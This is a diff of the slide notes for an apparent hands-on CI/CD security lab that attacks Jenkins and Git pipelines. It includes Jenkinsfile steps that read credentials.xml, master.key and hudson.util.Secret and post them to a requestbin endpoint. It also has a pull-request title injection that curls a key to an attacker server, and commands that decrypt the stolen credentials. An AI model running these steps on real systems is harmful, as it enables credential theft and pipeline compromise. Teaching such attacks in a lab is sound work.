@@ -29,62 +29,16 @@ withCredentials([string(credentialsId 'flag1', variable: 'flag1')])
 }
 ```
 
-### Slide 25
+### Slide 24
 
-Replace `any` with the below
+Decode the flag 
+
+> Replace {base64} with the base64 in the console output
 ```
-{node 'built-in'}
-```
->e.g. `agent {node 'built-in'}`
-
-Add the following to the `sh """` block
-```
-echo $JENKINS_HOME
-cat $JENKINS_HOME/credentials.xml | base64
-cat $JENKINS_HOME/secrets/master.key | base64
-cat $JENKINS_HOME/secrets/hudson.util.Secret | base64
-ls $JENKINS_HOME
-cat $JENKINS_HOME/flag5.txt
-```
->Your code should look like the below:
->```
->sh """
->    virtualenv venv
->    pip install -r requirements.txt || true
->    echo $JENKINS_HOME
->    cat $JENKINS_HOME/credentials.xml | base64
->    cat $JENKINS_HOME/secrets/master.key | base64
->    cat $JENKINS_HOME/secrets/hudson.util.Secret | base64
->    ls $JENKINS_HOME
->    cat $JENKINS_HOME/flag5.txt
->"""
->```
-
->**Note**: Jenkins is a fork of Hudson https://en.wikipedia.org/wiki/Hudson_(software) which was originally made by Sun Microsystems as an Open Source Project, then forked when Oracle bought it and wanted to trademark/monitize Hudson. So you'll sometimes see references to it such as in one of the files above.
-
-### Slide 26
-
-
-Go to requestbin.com and create a public bin
-
-```
-stage('Install Requirements') {
-  steps {
-    sh """
-      curl -X POST \
-      -F "file1=\$(cat $JENKINS_HOME/credentials.xml | base64 -w 0 | rev)" \
-      -F "file2=\$(cat $JENKINS_HOME/secrets/master.key | base64 -w 0 | rev)" \
-      -F "file3=\$(cat $JENKINS_HOME/secrets/hudson.util.Secret |base64 -w 0 | rev)" \
-      -F "file4=\$(cat $JENKINS_HOME/flag5.txt | base64 | rev)" \
-      ENDPOINT_URL
-    """
-  }
-
-
-}
+echo "{base64}" | base64 -d
 ```
 
-### Slide 29
+### Slide 27
 
 ```
 docker pull ghcr.io/gitleaks/gitleaks:latest
@@ -110,7 +64,7 @@ ls -al
 git log -L 8,8:.pypirc 43f216c
 ```
 
-### Slide 33
+### Slide 31
 
 Return to home from less exercise
 ```
@@ -139,7 +93,7 @@ Paste this into pull request title, replace `<YOUR SERVER IP>` with the one you 
 echo ${KEY} > key && curl -v -F file=@key <YOUR SERVER IP>
 ```
 
-### Slide 37
+### Slide 35
 
 ```
 git clone http://localhost:3000/Wonderland/mock-turtle.git
@@ -165,7 +119,7 @@ Save the file `Ctrl-O`
 
 Exit nano `Ctrl-X`
 
-### Slide 38
+### Slide 36
 
 ```
 nano Jenkinsfile
@@ -207,6 +161,94 @@ Go to Jenkins and you should see an automated build kicked off for the new "vers
 
 Look at the console output of the new build.
 
+### Slide 41
+
+Replace `any` with the below
+```
+built-in
+```
+>e.g. `agent {node 'built-in'}`
+
+Add the following to the `sh """` block
+```
+echo $JENKINS_HOME
+cat $JENKINS_HOME/credentials.xml | base64
+cat $JENKINS_HOME/secrets/master.key | base64
+cat $JENKINS_HOME/secrets/hudson.util.Secret | base64
+ls $JENKINS_HOME
+cat $JENKINS_HOME/flag5.txt
+```
+>Your code should look like the below:
+>```
+>sh """
+>    virtualenv venv
+>    pip install -r requirements.txt || true
+>    echo $JENKINS_HOME
+>    cat $JENKINS_HOME/credentials.xml | base64
+>    cat $JENKINS_HOME/secrets/master.key | base64
+>    cat $JENKINS_HOME/secrets/hudson.util.Secret | base64
+>    ls $JENKINS_HOME
+>    cat $JENKINS_HOME/flag5.txt
+>"""
+>```
+
+>**Note**: Jenkins is a fork of Hudson https://en.wikipedia.org/wiki/Hudson_(software) which was originally made by Sun Microsystems as an Open Source Project, then forked when Oracle bought it and wanted to trademark/monitize Hudson. So you'll sometimes see references to it such as in one of the files above.
+
+### Slide 42
+
+
+Go to requestbin.com and create a public bin
+
+```
+stage('Install Requirements') {
+  steps {
+    sh """
+      curl -X POST \
+      -F "file1=\$(cat $JENKINS_HOME/credentials.xml | base64 -w 0 | rev)" \
+      -F "file2=\$(cat $JENKINS_HOME/secrets/master.key | base64 -w 0 | rev)" \
+      -F "file3=\$(cat $JENKINS_HOME/secrets/hudson.util.Secret |base64 -w 0 | rev)" \
+      -F "file4=\$(cat $JENKINS_HOME/flag5.txt | base64 | rev)" \
+      ENDPOINT_URL
+    """
+  }
+
+
+}
+```
+
+### Extract the creds
+
+For each of the files you need to decode them and write them to the a file.
+
+```
+echo "{base64}" | rev | base64 -d > credentials.xml
+```
+
+```
+echo "{base64}" |rev |base64 -d > master.key
+```
+
+```
+echo "{base64}" |rev base64 -d > hudson.util.Secret
+```
+
+We can use a docker image with a Jenkins credential storage decrypter from here.
+
+```
+docker run \
+  --rm \
+  --network none \
+  --workdir / \
+  --mount "type=bind,src=$PWD/master.key,dst=/master.key" \
+  --mount "type=bind,src=$PWD/hudson.util.Secret,dst=/hudson.util.Secret" \
+  --mount "type=bind,src=$PWD/credentials.xml,dst=/credentials.xml" \
+  docker.io/hoto/jenkins-credentials-decryptor:latest \
+  /jenkins-credentials-decryptor \
+    -m master.key \
+    -s hudson.util.Secret \
+    -c credentials.xml \
+    -o json
+```
 
 ### Resources
 
